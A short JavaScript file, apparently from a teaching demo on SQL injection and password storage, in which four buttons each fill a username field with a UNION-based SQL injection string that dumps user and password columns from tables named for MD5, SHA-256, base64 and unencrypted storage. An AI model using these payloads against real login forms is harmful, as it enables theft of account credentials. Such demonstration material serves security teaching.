document.getElementById("sde1").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, encrypted_password FROM accounts_md5;#";
	document.getElementById('dbToken').value = "2";
});

document.getElementById("sde2").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, encrypted_password FROM accounts_sha256;#";
	document.getElementById('dbToken').value = "3";
});

document.getElementById("sde3").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, password FROM accounts_unencrypted;#";
	document.getElementById('dbToken').value = "1";
});

document.getElementById("sde4").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, encrypted_password FROM accounts_base64;#";
	document.getElementById('dbToken').value = "1";
});
